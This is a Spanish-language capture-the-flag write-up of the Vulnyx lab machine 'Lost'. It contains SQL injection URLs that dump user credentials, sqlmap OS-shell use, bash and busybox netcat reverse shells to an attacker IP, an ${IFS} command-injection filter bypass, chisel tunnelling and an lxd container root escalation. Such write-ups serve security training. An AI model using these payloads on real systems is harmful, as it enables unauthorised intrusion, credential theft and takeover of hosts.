---
description: 'Difficulty: Hard'
---

# Lost

* La IP de la máquina Lost en mi caso:

<figure><img src="../../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>

### Recon

1. Realizamos un escaneo con Nmap contra el objetivo:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.110
```

<figure><img src="../../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

* Puertos identificados:
  * 22 → Servicio SSH
  * 80 → Servicio web

2. Añadimos el host a /etc/hosts:

```bash
echo “192.168.56.110 lost.nyx” >> /etc/hosts
```

<figure><img src="../../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>

3. Visitamos el objetivo desde el navegador web:

<figure><img src="../../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

* Nos encontramos una página con una animación de la intro de la serie “Lost”.

4. Parece que estamos un poco a ciegas, vamos a hacer una enumeración de subdominios a ver que encontramos:

```bash
wfuzz --hc=404,400 --hl=34 -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H 'Host: FUZZ.lost.nyx' -u http://lost.nyx
```

<figure><img src="../../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>

* Subdominio identificado:
  * dev

5. Añadimos el subdominio a /etc/hosts y accedemos al subdominio **dev.lost.nyx**:

<figure><img src="../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

6. Navegamos por el subdominio y encontramos una página que parece interesante por el mensaje que vemos:

<figure><img src="../../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

* Parece que al dar un ID, podemos ver información sobre el pasajero.

### SQL Injection

7. Como prueba, añadimos un id y vemos que se muestra la información de uno de los pasajeros:

<figure><img src="../../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

8. Cambiamos el valor del id, por una comilla simple `'` para forzar un fallo SQL y ver si es vulnerable a inyecciones:

<figure><img src="../../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

9. Esto funciona, esto quiere decir que el valor del parámetro pasado por la URL no se sanitiza. Probamos una inyección más avanzada:

> http://dev.lost.nyx/passengers.php?id=1 or 1=1 -- -

<figure><img src="../../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

10. Probaremos diferentes inyecciones SQL para obtener más información de la estructura de la base de datos:

> http://dev.lost.nyx/passengers.php?id=1 union select schema\_name,2,3,4 from information\_schema.schemata-- -

<figure><img src="../../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

* Columnas de la tabla users:

> http://dev.lost.nyx/passengers.php?id=1 union select column\_name,2,3,4 from information\_schema.columns where table\_name = 'users'-- -

<figure><img src="../../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

* Contenido de la tabla users:

> http://dev.lost.nyx/passengers.php?id=1 union select username,password,2,3 from users-- -

<figure><img src="../../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

### Password Decode

11. Las credenciales que hemos obtenido, las pasamos a un archivo:

<figure><img src="../../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

12. Para decodear los hashes se guardarán en un archivo sin el nombre de usuario:

<figure><img src="../../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

13. Utilizaremos hashcat para crackear los hashes:

```bash
hashcat -m 1400 -a 0 hashes /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

* Pero no conseguimos decodificar ningún hash.

### Shell (SQLMap)

14. Para poder seguir avanzando, hemos identificado una vulnerabilidad de inyección SQL, así que utilizaremos SQLMap para obtener una shell:

```bash
sqlmap -u "http://dev.lost.nyx/passengers.php?id=1" -p id --os-shell
```

<figure><img src="../../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

* Obtenemos una shell y podemos ejecutar comandos de sistema.

### Reverse Shell

15. Podemos ejecutar comandos a través de la shell obtenida con sqlmap. Creamos una reverse shell en un archivo .sh con el siguiente contenido:

> bash -i >& /dev/tcp/(192.168.56.101)/443 0>&1> \
> python3 -m http.server 8000

<figure><img src="../../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

* Levantamos un servidor HTTP en nuestra máquina atacante:

```bash
python3 -m http.server 8000
```

<figure><img src="../../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

* Ponemos una consola Netcat a la escucha en nuestra máquina atacante:

```bash
nc -vnlp 443
```

<figure><img src="../../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

16. Desde la máquina objetivo descargamos el archivo reverse\_shell.sh:

```bash
wget http://192.168.56.101:8000/reverse_shell.sh
```

<figure><img src="../../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

* Asignamos permisos y ejecutamos el script reverse\_shell.sh:

<figure><img src="../../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

* Recibimos la conexión en la consola a la escucha:

<figure><img src="../../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

### Tratamiento TTY

* El tratamiento de la TTY consiste en convertir una shell básica o limitada (por ejemplo, obtenida por netcat o reverse shell) en una shell totalmente interactiva, para así usar atajos de teclado, limpiar pantalla, mover el cursor, ejecutar editores y comandos interactivos como si fuese una terminal local. Se utiliza principalmente para:
  * Hacer la shell más usable y cómoda (mover con flechas, tabulación, historial, etc.).
  * Permitir ejecutar comandos o programas que requieren una terminal real (TTY), como su, sudo, nano, vi, etc.

17. Hacemos el tratamiento de la TTY:

```bash
script /dev/null -c bash
[Ctrl+Z]
stty raw -echo; fg
reset xtermcd
export TERM=xterm
export SHELL=bash
```

### Recon interno

18. Mostramos la información de los puertos a la escucha:

```bash
ss -tuln
```

<figure><img src="../../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

* Descubrimos el **puerto 3000** que no aparecía en el primer escaneo.

### Reverse Port Forwarding

19. Se realizará un port forwarding para poder atacar este puerto desde la máquina atacante. Para ello primero preparamos el binario de chisel para traspasarlo:

```bash
base64 /usr/bin/chisel > chisel.b64
```

*   En la máquina atacante en 2 shells distintas:&#x20;

    * Shell 1:&#x20;

    `python3 -m http.server 8000`

    * Shell 2:&#x20;

    `chisel server --reverse -p 4000`

<figure><img src="../../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

* Y desde la máquina víctima haremos lo siguiente para descargar chisel y decodearlo:

```bash
wget http://192.168.56.101:8000/chisel.b64 -O /tmp/chisel.b64
```

<figure><img src="../../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

```bash
base64 -d /tmp/chisel.b64 > /tmp/chisel
chmod +x /tmp/chisel
ls -l /tmp/chisel
```

<figure><img src="../../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

20. Hacemos el forwarding:

```bash
/tmp/chisel client 192.168.56.101:4000 R:3000:127.0.0.1:3000
```

<figure><img src="../../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>

* Veremos la conexión en la máquina atacante:

<figure><img src="../../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>

* Desde la máquina atacante se podrá acceder al navegador y ver lo que hay en el puerto de la víctima:

> http://localhost:3000

<figure><img src="../../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

21. Al acceder a `localhost:3000` desde el navegador, encontramos un input en el que podemos hacer ping a una IP:

<figure><img src="../../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

* Esto quiere decir que ejecuta comandos de sistema, así que probaremos con alguno del que podamos obtener un output que nos sirva para seguir avanzando en la máquina.

<figure><img src="../../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

* Lo detecta como malicioso, así que habrá que intentar bypassear el filtro, por ejemplo con caracteres especiales.

<figure><img src="../../../.gitbook/assets/image (597).png" alt=""><figcaption></figcaption></figure>

* Después de probar con varios caracteres especiales `'`, `!`, `--` conseguimos el bypass con `|`.

22. Ahora que podemos bypassear el filtro del input, nos enviaremos una reverse shell, en mi caso generé una en [https://www.revshells.com/](https://www.revshells.com/):

<figure><img src="../../../.gitbook/assets/image (598).png" alt=""><figcaption></figcaption></figure>

* Ponemos en nuestra máquina atacante una consola con netcat a la escucha:

```bash
nc -lvnp 1234
```

<figure><img src="../../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>

* Ejecutamos la reverse shell en el input:

> busybox nc 192.168.56.101 1234 -e sh

<figure><img src="../../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

* Pero la detecta como maliciosa.

23. Detectará el intento de reverse shell porque lo estamos haciendo directamente. Habrá que reemplazar los espacios por `${IFS}`, esto son separadores de campos internos. La shell lo detectará como un espacio y nos permitirá bypassear el filtro del input:

> |busybox${IFS}nc${IFS}192.168.56.101${IFS}1234${IFS}-e${IFS}sh

<figure><img src="../../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>

* La página se quedará con el icono de carga y en la consola a la escucha recibiremos la conexión:

<figure><img src="../../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

24. Mostraremos los privilegios que tiene el usuario:

<figure><img src="../../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

* Pertenece al grupo lxd.

### Privilege Escalation by Group

25. Desde la máquina atacante, tendremos que crear un archivo Alpine y transferirlo a la máquina víctima de la siguiente manera:

```bash
sudo wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
```

<figure><img src="../../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

```bash
sudo bash build-alpine
```

<figure><img src="../../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

* **Desde la máquina víctima:**
* Obtenemos la imagen de la máquina atacante primero moviendonos al directorio /tmp:

```bash
cd /tmp 
wget http://192.168.56.101:8000/alpine-v3.22-x86_64-20250926_2158.tar.gz
```

<figure><img src="../../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

* Importamos:

```bash
lxc image import alpine-v3.22-x86_64-20250926_2158.tar.gz --alias alpine-v3.22
```

<figure><img src="../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

* Nos aseguramos de que se haya importado bien:

```bash
lxc image list
```

<figure><img src="../../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

* Creamos el contenedor con privilegios:

```bash
lxc init alpine-v3.22 privesc -c security.privileged=true
```

<figure><img src="../../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

* Añadimos el dispositivo para crear la raíz del host:

```bash
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
```

<figure><img src="../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

* Iniciamos el contenedor:

```bash
lxc start privesc
```

<figure><img src="../../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

* Entramos al contenedor con shell:

```bash
lxc exec privesc sh
```

<figure><img src="../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

* Accedemos a la raíz montada:

```bash
cd /mnt/root
```

<figure><img src="../../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

* Confirmamos que somos root:

```bash
whoami
```

<figure><img src="../../../.gitbook/assets/image (614).png" alt=""><figcaption></figcaption></figure>

### Flags

#### Flag user.txt

<figure><img src="../../../.gitbook/assets/image (615).png" alt=""><figcaption></figcaption></figure>

* La flag **user.txt** se encuentra en el directorio /home/jackshephard

#### Flag root.txt

<figure><img src="../../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>

* La flag **root.txt** se encuentra en el directorio /root/

### Links

* [https://www.revshells.com/](https://www.revshells.com/) :arrow\_right: Plataforma online para generar comandos personalizados de reverse shell para distintos sistemas y lenguajes.
* Ha habido en partes que estuve atascado y si no fuera por los siguientes writeups no hubiese podido continuar:
  * Luca Wolffart: [https://github.com/wolffart-luca/Vulnyx/blob/main/lost.md](https://github.com/wolffart-luca/Vulnyx/blob/main/lost.md)
  * blackpist0l: [https://blackpist0l.hashnode.dev/lost-vulnyx-machine](https://blackpist0l.hashnode.dev/lost-vulnyx-machine)
